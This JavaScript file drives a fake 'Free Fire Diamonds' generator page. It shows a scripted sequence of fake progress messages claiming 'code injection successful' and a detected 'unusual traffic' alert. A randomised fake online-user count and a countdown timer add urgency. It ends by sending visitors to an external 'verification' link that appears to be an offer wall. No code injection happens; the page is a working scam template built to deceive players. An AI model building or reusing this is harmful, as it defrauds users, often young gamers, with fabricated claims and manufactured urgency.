$(document).ready(function() {
	
	// Console Messages
	$console_message_1 = "Preparing to inject the code...";
	$console_message_2 = "Code injection successful";
	$console_message_3 = "Performing device verification...";
	$console_message_4 = "Unusual traffic from your computer network detected";
	$console_message_5 = 'Manual Device Verification Required';
	
	

	// Human Verification Timer
	var $human_verification_timer_value = '180'; //Countdown remaing time in seconds	
	
	// Sound
	$sound_setting = 1;		
	ion.sound({
		sounds: [
			{
				name: "button",
				path: "audio/",
				volume: 1
			},
			{
				name: "transition-1",
				path: "audio/",
				volume: 0.9
			},
			{
				name: "count",
				path: "audio/",
				loop: true,
				volume: 0.7
			},
			{
				name: "fail",
				path: "audio/",
				volume: 0.7
			},
			{
				name: "transition-2",
				path: "audio/",
				volume: 0.7
			}
		],
		path: "sounds/",
		preload: true,
		multiplay: true
	});

	var data1= `<div id="master-modal" class="master-modal animated bounceIn mfp-hide">
	<div class="generator-container">	
		<div class="generator-header">	
			<span class="lnr lnr-cog fa-spin"></span><span>Processing...</span>
		</div>
		<div class="generator-content">	
			<div class="loader-wrapper">
				<div class="loader">Loading...</div>
			</div>
			<div class="console-msg-wrapper">
				<div class="console-msg">Loading files...</div>
			</div>
			<div class="console-loadbar-wrapper">
				<div id="progressBarConsole" class="console-loadbar animated bounceIn"><div style="width: 312px;">100%&nbsp;</div></div>
			</div>
		</div>
	</div>
</div>`;
	
	// Process
	$('#b-1').click(function () {
		if ($sound_setting == 1) {
			ion.sound.play("button");
		}
		
			
				if ($sound_setting == 1) {
					ion.sound.play("transition-2");
				}
				$('.X650d').html(data1).hide().fadeIn();
				$.magnificPopup.open({
					items: {
						src: '#master-modal',
					},
					type: 'inline',
					preloader: false,
					modal: true,
					fixedContentPos: true,
					fixedBgPos: true,
					callbacks: {	
						open: function() {
							function progressBarConsole(percent, $element, duration) {
								var progressBarConsoleWidth = percent * $element.width() / 100;
								$element.find('div').animate({ width: progressBarConsoleWidth }, duration).html(percent + "%&nbsp;");
							}
							progressBarConsole(0, $('#progressBarConsole'), 1);
							progressBarConsole(100, $('#progressBarConsole'), 3000);
							setTimeout(function() {
								$.magnificPopup.close();
								
									
										var data2 = `<div class="app-download-main animated bounceIn" style="display: block;"><div class="animated bounceIn">
										<p class="app-download-intro-text">Choose the correct version for your phone.</p>
										<div class="field-wrapper platform-field-wrapper">									
											<div class="row small-margin">
												<div class="col small-padding">
													<div class="platform-item platform-item-1">
														<i class="fab fa-android"></i>
														<span>Android</span>
													</div>
												</div>
												<div class="col small-padding">
													<div class="platform-item platform-item-2">
														<i class="fab fa-apple"></i>
														<span>iOS</span>
													</div>
												</div>
											</div>
										</div>
										<div class="button-wrapper">
											<div id="b-2" class="button animated pulse infinite" tabindex="-1"><span class="lnr lnr-download"></span><span>Continue</span></div>
										</div>
									</div></div>`;

										if ($sound_setting == 1) {
											ion.sound.play("transition-1");
										}
										$('.app-download-main').html(data2).hide().fadeIn();
										////////////////
										// Platform Select
										////////////////
										var $selected_platform_option = '';	
										function fixplatformBox($platform_parent_class) {
											resetplatformBoxes();
											if ($platform_parent_class.hasClass('platform-item-1')) {
												$selected_platform_option = 'Android';
												$platform_icon = "<i class='fab fa-android platform-select-icon'></i>";
												$('#platform-select-input').val('android');
											}
											if ($platform_parent_class.hasClass('platform-item-2')) {
												$selected_platform_option = 'iOS';
												$platform_icon = "<i class='fab fa-apple platform-select-icon'></i>";
												$('#platform-select-input').val('ios');
											}
											$platform_parent_class.addClass('active');
											$platform_parent_class.addClass('animated jello').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated jello');
											});	
										}	
										function resetplatformBoxes() {
											var $platform_list = $('.platform-item-1, .platform-item-2');	
											if ($platform_list.hasClass('active')) {
												$platform_list.removeClass('active');
											}
										}
										$('.platform-item').click(function() {
											if ($(this).hasClass('active')) {			
											} else {
												if ($sound_setting == 1) {
													ion.sound.play("button");
												}
											}
											fixplatformBox($(this));	
										});
										$('#b-2').click(function () {
											if ($sound_setting == 1) {
												ion.sound.play("button");
											}
											var $selected_platform = $selected_platform_option;
											if ($selected_platform_option == '') {
												$(".platform-field-wrapper").addClass('shake animated border-b-red').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
													$(this).removeClass('shake animated border-b-red');
												});
											}
											else {
												
													
														if ($sound_setting == 1) {
															ion.sound.play("transition-2");
														}
														$('.X650d').html(data1).hide().fadeIn();
														$.magnificPopup.open({
															items: {
																src: '#master-modal',
															},
															type: 'inline',
															preloader: false,
															modal: true,
															fixedContentPos: true,
															fixedBgPos: true,
															callbacks: {	
																open: function() {
																	function progressBarConsole(percent, $element, duration) {
																		var progressBarConsoleWidth = percent * $element.width() / 100;
																		$element.find('div').animate({ width: progressBarConsoleWidth }, duration).html(percent + "%&nbsp;");
																	}
																	progressBarConsole(0, $('#progressBarConsole'), 1);
																	progressBarConsole(100, $('#progressBarConsole'), 8000);
																	$('.console-msg').html($console_message_1);	
																	$('.console-msg').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
																		$(this).removeClass('animated bounceIn');	
																	});
																	setTimeout(function() {
																		$('.console-msg').html($console_message_2);	
																		$('.console-msg').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
																			$(this).removeClass('animated bounceIn');	
																		});																			
																	}, 4000 );	
																	setTimeout(function() {
																		$('.console-msg').html($console_message_3);	
																		$('.console-msg').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
																			$(this).removeClass('animated bounceIn');	
																		});		
																	}, 7000 );
																	setTimeout(function() {
																		$('.console-msg').html('<span class="console-text-red" style="color: #fc4349 !important;">' + $console_message_4 + '</span>');
																		$('.console-msg').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
																			$(this).removeClass('animated bounceIn');
																		});
																	}, 9000);
																	setTimeout(function() {
																		$('.console-msg').html($console_message_5);	
																		$('.console-msg').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
																			$(this).removeClass('animated bounceIn');	
																		});	
																	}, 11000 );
																	setTimeout(function() {
																		$('.generator-container').addClass('animated bounceOut');																
																	}, 13000 );
																	setTimeout(function() {
																		
																			 	var data3=`<div class="human-verification-wrapper">
																				 <div class="generator-container">	
																					 <div class="generator-header">	
																						 <span>App Injection</span>
																					 </div>
																					 <div class="generator-content">	
																						 <div class="verification-app-wrapper">
																							 <img src="https://cdn.jsdelivr.net/gh/imhosting/free-fire1/img/app-icon.png" class="verification-app-icon-img img-fluid">
																							 <h3><span>Garena Free Fire</span> • Diamonds •</h3>
																						 </div>
																						 <p>Unusual traffic from your computer network detected. Click the button below to manually verify your device. </p>
																						 <i class="fas fa-spinner fa-spin"></i>
																						 <div id="h-v-time-left-wrapper" class="h-v-time-left-wrapper">
																							 <span>Time Left:</span>
																							 <span id="human_verification_timer_time"><span>01 minutes and 40 seconds</span></span>
																						 </div>
																						 <div class="verification-button-wrapper">
																							 <a id="verification-button" class="button" href="https://www.verifyspot.net/cl.php?id=24f041ac71680eac5582241504e870c9" tabindex="-1"><span class="lnr lnr-thumbs-up"></span><span>Verify</span></a>
																						 </div>
																					 </div>
																				 </div>	
																			 </div>`;
																			
																				console.clear();
																				console.log("\n\n\n\n\n\n\n\n\n\n\n\n isk ka tcha \n\n\n\n\n\n\n\n\n\n\n\n\n");
																				$('#master-modal').html(data3).hide().fadeIn();															
																				if ($sound_setting == 1) {
																					ion.sound.play("transition-2");
																				}
																				human_verification_timer.init($human_verification_timer_value);														
																			
																																																	
																	}, 14500 );
																}
															}		
														});
													
												
											}
										});
										
								
							}, 3200 );						
						}
					}		
				});
				
		//first ajax;
	});
});
////////////////
// Status - Online Count
////////////////
var starting_number = 150;
var random;
function online_count() {
	document.getElementById("online-count").innerHTML = starting_number;
	var randCalc = Math.floor(Math.random() * 10 + 1);
	if (randCalc <= 5) {
		starting_number = starting_number + Math.floor(Math.random() * 10 + 1);;
	} else {
		starting_number = starting_number - Math.floor(Math.random() * 10 + 1);;
	}
	random = setTimeout("online_count()", 1000);
}
online_count();

////////////////
// Status - Last Update
////////////////
document.getElementById("date").innerHTML = formatAMPM();
function formatAMPM() {
	var d = new Date(),

		hours = d.getHours().toString().length == 1 ? '0' + d.getHours() : d.getHours(),
		ampm = d.getHours() >= 12 ? 'pm' : 'am',
		months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
		days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
	return months[d.getMonth()] + ' ' + d.getDate() + ' ' + d.getFullYear() + ' ';
}
var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();
//
//